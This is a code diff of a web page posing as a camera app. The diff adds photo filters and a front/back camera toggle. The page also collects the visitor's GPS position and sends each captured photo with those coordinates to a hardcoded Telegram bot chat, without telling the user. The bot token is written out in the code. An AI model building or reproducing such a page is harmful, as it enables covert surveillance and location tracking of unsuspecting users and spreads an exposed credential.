@@ -89,7 +89,7 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 12px;
+      font-size: 12px; /* Reduced font size */
       color: white;
     }
 
@@ -147,9 +147,19 @@
 
     <!-- Controls -->
     <div id="controls">
+      <!-- Filter Buttons -->
+      <div class="filter-buttons">
+        <button class="filter-button" data-filter="grayscale">GS</button>
+        <button class="filter-button" data-filter="sepia">S</button>
+        <button class="filter-button" data-filter="invert">I</button>
+        <button class="filter-button" data-filter="blur">B</button>
+        <button class="filter-button" data-filter="none">N</button>
+      </div>
+
       <!-- Action Buttons -->
       <div id="action-buttons">
         <div id="capture" class="button">📸</div>
+        <div id="toggle-camera" class="button">🔄</div>
       </div>
     </div>
   </div>
@@ -157,86 +167,136 @@
 <script>
   const video = document.getElementById('camera');
   const captureButton = document.getElementById('capture');
+  const toggleCameraButton = document.getElementById('toggle-camera');
+  const filterButtons = document.querySelectorAll('.filter-button');
+
   let currentStream = null;
-  let gpsLocation = null; 
+  let usingFrontCamera = true;
+  let gpsLocation = null;
+
+  // الفلتر الافتراضي
+  let currentFilter = 'none';
 
   // Start camera
-  async function startCamera() {
+  async function startCamera(front = true) {
+    const constraints = {
+      video: {
+        facingMode: front ? 'user' : 'environment',
+      },
+    };
+
+    if (currentStream) {
+      currentStream.getTracks().forEach(track => track.stop());
+    }
+
     try {
-      const constraints = { video: true };
       currentStream = await navigator.mediaDevices.getUserMedia(constraints);
       video.srcObject = currentStream;
+
+      if (front) {
+        video.style.transform = 'scaleX(-1)';
+      } else {
+        video.style.transform = 'scaleX(1)';
+      }
     } catch (error) {
       console.error('Error accessing camera:', error);
       alert('Error accessing camera. Please check camera permissions.');
     }
   }
 
-  // Capture image and send to Telegram bot
+  // Toggle camera
+  toggleCameraButton.addEventListener('click', () => {
+    usingFrontCamera = !usingFrontCamera;
+    startCamera(usingFrontCamera);
+  });
+
+  // Capture image and send it to Telegram bot
   captureButton.addEventListener('click', () => {
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
     const ctx = canvas.getContext('2d');
+    ctx.filter = currentFilter; // تطبيق الفلتر أثناء الالتقاط
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     const image = canvas.toDataURL('image/png');
-    const byteCharacters = atob(image.split(',')[1]);
-    const byteArrays = [];
+    const blob = dataURLToBlob(image);
 
-    for (let offset = 0; offset < byteCharacters.length; offset++) {
-      const byteArray = new Uint8Array(1);
-      byteArray[0] = byteCharacters.charCodeAt(offset);
-      byteArrays.push(byteArray);
-    }
-
-    const blob = new Blob(byteArrays, { type: 'image/png' });
-
-    // Send the image and GPS location to Telegram bot
     sendImageAndLocationToTelegram(blob);
   });
 
   // Get GPS location
   navigator.geolocation.getCurrentPosition(
     position => {
-      const { latitude, longitude } = position.coords;
-      gpsLocation = { latitude, longitude };
-      console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+      gpsLocation = position.coords;
     },
-    error => {
-      console.error('Error getting location:', error);
-      alert('Error getting location. Please check location permissions.');
-    }
+    error => console.error('Error getting location:', error)
   );
 
-  // Send the image and GPS location to Telegram bot
-  function sendImageAndLocationToTelegram(imageBlob) {
-    const formData = new FormData();
-    formData.append('chat_id', '1676411287'); 
-    formData.append('photo', imageBlob, 'photo.png');
-    formData.append(
-      'caption',
-      gpsLocation
-        ? `Location: Latitude ${gpsLocation.latitude}, Longitude ${gpsLocation.longitude}`
-        : 'Location information not available.'
-    );
+  // Apply filter when filter button is clicked
+  filterButtons.forEach(button => {
+    button.addEventListener('click', () => {
+      // إزالة الفئة النشطة من كل الأزرار
+      filterButtons.forEach(btn => btn.classList.remove('active'));
 
-    fetch('https://api.telegram.org/bot5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI/sendPhoto', {
-      method: 'POST',
-      body: formData,
-    })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Telegram response:', data);
-      })
-      .catch(error => {
-        console.error('Error sending image to Telegram:', error);
-      });
+      // إضافة الفئة النشطة إلى الزر الحالي
+      button.classList.add('active');
+
+      // تحديث الفلتر بناءً على الزر
+      currentFilter = button.dataset.filter;
+
+      // تطبيق الفلتر على الفيديو
+      video.style.filter = getCSSFilter(currentFilter);
+    });
+  });
+
+  // Map filter names to CSS filter properties
+  function getCSSFilter(filterName) {
+    switch (filterName) {
+      case 'grayscale': return 'grayscale(100%)';
+      case 'sepia': return 'sepia(100%)';
+      case 'invert': return 'invert(100%)';
+      case 'blur': return 'blur(5px)';
+      case 'none': return 'none';
+      default: return 'none';
+    }
   }
 
-  // Start the camera
-  startCamera();
+  // Send image and location to Telegram
+  function sendImageAndLocationToTelegram(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', '1676411287'); // Replace with your chat ID
+    formData.append('photo', blob, 'photo.png');
+
+    if (gpsLocation) {
+      formData.append('caption', `Location: Latitude ${gpsLocation.latitude}, Longitude ${gpsLocation.longitude}`);
+    }
+
+    fetch('https://api.telegram.org/bot5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI/sendPhoto', { // Replace with your bot token
+      method: 'POST',
+      body: formData
+    })
+    .then(response => response.json())
+    .then(data => console.log('Telegram response:', data))
+    .catch(error => console.error('Error sending data to Telegram:', error));
+  }
+
+  // Helper function to convert dataURL to Blob
+  function dataURLToBlob(dataURL) {
+    const byteString = atob(dataURL.split(',')[1]);
+    const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+    const byteArray = new Uint8Array(byteString.length);
+
+    for (let i = 0; i < byteString.length; i++) {
+      byteArray[i] = byteString.charCodeAt(i);
+    }
+
+    return new Blob([byteArray], { type: mimeString });
+  }
+
+  startCamera(true);
 </script>
+
 </body>
 </html>
